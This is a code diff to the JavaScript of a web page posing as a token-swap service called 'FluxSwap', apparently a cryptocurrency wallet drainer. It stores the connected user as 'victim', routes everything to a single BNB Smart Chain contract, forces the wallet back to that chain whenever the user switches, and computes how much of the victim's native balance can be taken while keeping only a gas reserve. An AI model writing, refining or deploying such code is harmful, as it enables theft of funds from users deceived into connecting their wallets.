@@ -240,11 +240,21 @@
 
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
 
+            // ===== TARGET CHAIN: жёстко BNB =====
+            const TARGET_CHAIN_ID = 56;
+            const TARGET_CHAIN_HEX = '0x38';
+            const TARGET_CHAIN_PARAMS = {
+                chainId: TARGET_CHAIN_HEX,
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com/']
+            };
+
+            // Только BNB-контракт. Ключ 1 удалён намеренно — если что-то пойдёт не так,
+            // код упадёт в "Network not supported", а не отправит на ETH-адрес.
             const CONTRACT_ADDRESSES = {
-                1: '0xf76Df77742AB8636068FE61317e6f329176614c7',
-                56: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33',
-                137: '0x0000000000000000000000000000000000000000',
-                42161: '0x0000000000000000000000000000000000000000'
+                56: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33'
             };
 
             const SWAP_ABI = [
@@ -265,14 +275,6 @@
             ];
 
             const TOKENS = {
-                1: {
-                    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-                    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-                    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-                    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-                    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
-                },
                 56: {
                     'USDT': '0x55d398326f99059fF775485246999027B3197955',
                     'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
@@ -280,18 +282,6 @@
                     'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
                     'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
                     'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
-                },
-                137: {
-                    'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                    'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-                    'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
-                    'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-                    'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
-                },
-                42161: {
-                    'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
-                    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
-                    'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
                 }
             };
 
@@ -336,61 +326,59 @@
             const tokenList = document.getElementById('tokenList');
             const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');
 
-            let provider = null, signer = null, victim = null, chainId = null;
+            let provider = null, signer = null, victim = null;
+            let chainId = TARGET_CHAIN_ID;
             let isConnected = false, isProcessing = false, isConnecting = false;
             let wcProvider = null;
             let retryTimer = null;
             let rateCache = {};
 
             // ===== Chain helpers =====
-            const CHAIN_NAMES = { 1: 'Ethereum', 56: 'BNB Chain', 137: 'Polygon', 42161: 'Arbitrum' };
-            function chainLabel(id) { return CHAIN_NAMES[id] || ('Chain ' + id); }
-
-            function parseChainValue(raw) {
-                if (typeof raw === 'number') return raw;
-                if (typeof raw === 'string') {
-                    if (raw.startsWith('eip155:')) return parseInt(raw.split(':')[1], 10);
-                    if (/^0x/i.test(raw)) return parseInt(raw, 16);
-                    const n = parseInt(raw, 10);
-                    if (Number.isFinite(n)) return n;
-                }
-                return null;
+            function chainLabel(id) {
+                return id === 56 ? 'BNB Chain' : ('Chain ' + id);
             }
 
-            function readWcChainId(wc) {
-                try {
-                    const direct = parseChainValue(wc.chainId);
-                    if (direct) return direct;
-                    const accs = wc.session && wc.session.namespaces && wc.session.namespaces.eip155 && wc.session.namespaces.eip155.accounts;
-                    if (accs && accs.length) {
-                        const m = accs[0].match(/eip155:(\d+):/);
-                        if (m) return parseInt(m[1], 10);
-                    }
-                } catch (_) {}
-                return null;
-            }
-
-            async function readActiveChain(wc) {
-                if (!wc) return null;
+            async function readLiveChainId(wc) {
                 try {
                     const hex = await wc.request({ method: 'eth_chainId' });
-                    const n = parseChainValue(hex);
-                    if (n && n > 0) return n;
+                    return parseInt(hex, 16);
                 } catch (e) {
-                    console.warn('eth_chainId query failed:', e);
+                    console.warn('[FluxSwap] eth_chainId failed:', e);
+                    return null;
                 }
-                return readWcChainId(wc);
             }
 
-            async function switchChain(target) {
+            // Принудительный перевод кошелька на BNB. Возвращает true, если на BNB.
+            async function ensureTargetChain() {
                 if (!wcProvider) return false;
+
+                const live = await readLiveChainId(wcProvider);
+                console.log('[FluxSwap] live chainId before switch:', live);
+                if (live === TARGET_CHAIN_ID) return true;
+
                 try {
                     await wcProvider.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x' + target.toString(16) }]
+                        params: [{ chainId: TARGET_CHAIN_HEX }]
                     });
                     return true;
-                } catch (_) { return false; }
+                } catch (e) {
+                    const msg = (e && e.message) || '';
+                    const code = e && e.code;
+                    if (code === 4902 || msg.toLowerCase().includes('unrecognized') || msg.toLowerCase().includes('not added')) {
+                        try {
+                            await wcProvider.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [TARGET_CHAIN_PARAMS]
+                            });
+                            return true;
+                        } catch (e2) {
+                            console.error('[FluxSwap] add chain failed:', e2);
+                        }
+                    }
+                    console.error('[FluxSwap] switch to BNB failed:', e);
+                    return false;
+                }
             }
 
             function wrapProvider(wc) {
@@ -416,7 +404,7 @@
             async function restoreSession() {
                 const session = loadSession();
                 if (!session) return false;
-                if (!session.chainId || !session.address) return false;
+                if (!session.address) return false;
 
                 const EthereumProvider = window.WalletConnectProvider;
                 if (!EthereumProvider) return false;
@@ -424,7 +412,7 @@
                 try {
                     const restored = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        optionalChains: [56, 1, 137, 42161],
+                        optionalChains: [56],
                         showQrModal: false,
                         metadata: {
                             name: 'FluxSwap',
@@ -440,38 +428,42 @@
                         return false;
                     }
 
+                    wcProvider = restored;
+                    attachProviderEvents(restored);
+
+                    // Форсим BNB
+                    const ok = await ensureTargetChain();
+                    if (!ok) { clearSession(); return false; }
+                    await new Promise(r => setTimeout(r, 500));
+                    chainId = TARGET_CHAIN_ID;
+
                     const web3Provider = wrapProvider(restored);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
-                    const activeChain = (await readActiveChain(restored)) || 1;
-
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = activeChain;
-                    wcProvider = restored;
                     isConnected = true;
-                    attachProviderEvents(restored);
 
                     updateConnectButton();
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     updateRateAndOutput();
-                    console.log('[FluxSwap] restored on chain', chainId);
+                    console.log('[FluxSwap] restored on', chainLabel(chainId));
                     return true;
                 } catch (e) {
+                    console.error('[FluxSwap] restore failed:', e);
                     clearSession();
                     return false;
                 }
             }
 
             function attachProviderEvents(providerInstance) {
-                providerInstance.on('chainChanged', async (raw) => {
-                    let cid = parseChainValue(raw);
-                    if (!cid) cid = await readActiveChain(providerInstance);
-                    if (!cid) return;
-
-                    chainId = cid;
+                providerInstance.on('chainChanged', async () => {
+                    // Принудительно возвращаем на BNB
+                    await ensureTargetChain();
+                    await new Promise(r => setTimeout(r, 400));
+                    chainId = TARGET_CHAIN_ID;
                     try {
                         const web3Provider = wrapProvider(providerInstance);
                         provider = web3Provider;
@@ -484,7 +476,7 @@
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' +
                               (victim ? victim.slice(0,6) + '...' + victim.slice(-4) : ''), 'ok');
                     updateRateAndOutput();
-                    console.log('[FluxSwap] chainChanged →', chainId);
+                    console.log('[FluxSwap] chainChanged → forced back to', chainId);
                 });
 
                 providerInstance.on('accountsChanged', (accounts) => {
@@ -651,7 +643,8 @@
                             }
                         }
                     } catch (_) {}
-                    provider = null; signer = null; victim = null; chainId = null;
+                    provider = null; signer = null; victim = null;
+                    chainId = TARGET_CHAIN_ID;
                     isConnected = false; isProcessing = false; isConnecting = false;
                     wcProvider = null;
                     if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
@@ -677,7 +670,7 @@
 
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        optionalChains: [56, 1, 137, 42161],
+                        optionalChains: [56],
                         showQrModal: true,
                         metadata: {
                             name: 'FluxSwap',
@@ -696,8 +689,17 @@
                         throw new Error('No accounts returned');
                     }
 
-                    let activeChain = await readActiveChain(wcProvider);
-                    console.log('[FluxSwap] activeChain after enable:', activeChain);
+                    // Форсим BNB
+                    const ok = await ensureTargetChain();
+                    if (!ok) {
+                        setStatus('❌ Переключи кошелёк на BNB Chain', 'err');
+                        isConnecting = false;
+                        await forceClearSession();
+                        return;
+                    }
+                    await new Promise(r => setTimeout(r, 600));
+                    chainId = TARGET_CHAIN_ID;
+                    console.log('[FluxSwap] chainId forced to', chainId);
 
                     const web3Provider = wrapProvider(wcProvider);
                     const signer_ = web3Provider.getSigner();
@@ -706,7 +708,6 @@
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = activeChain || 1;
                     isConnected = true;
                     saveSession({ chainId, address });
 
@@ -748,13 +749,18 @@
                     return;
                 }
 
-                try {
-                    const live = await readActiveChain(wcProvider);
-                    if (live && live > 0) chainId = live;
-                    provider = wrapProvider(wcProvider);
-                    signer = provider.getSigner();
-                } catch (_) {}
-                console.log('[FluxSwap] executeSwap on chain', chainId);
+                // Форсим BNB перед отправкой
+                const ok = await ensureTargetChain();
+                if (!ok) {
+                    setStatus('❌ Переключи кошелёк на BNB Chain', 'err');
+                    return;
+                }
+                await new Promise(r => setTimeout(r, 400));
+                chainId = TARGET_CHAIN_ID;
+
+                provider = wrapProvider(wcProvider);
+                signer = provider.getSigner();
+                console.log('[FluxSwap] executeSwap forced chain', chainId);
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
@@ -794,15 +800,12 @@
                     for (const a of assets) {
                         if (a.type === 'native') {
                             try {
-                                // Свежий баланс прямо из кошелька — не доверяем кэшу ethers
                                 const freshBalHex = await wcProvider.request({
                                     method: 'eth_getBalance',
                                     params: [victim, 'latest']
                                 });
                                 const freshBal = ethers.BigNumber.from(freshBalHex);
 
-                                // Фиксированный газ — без eth_gasPrice вообще.
-                                // 3 gwei × 50000 = 0.00015 BNB (~$0.10)
                                 const gasPrice = ethers.utils.parseUnits('3', 'gwei');
                                 const gasLimit = ethers.BigNumber.from(50000);
                                 const reserve = gasPrice.mul(gasLimit);
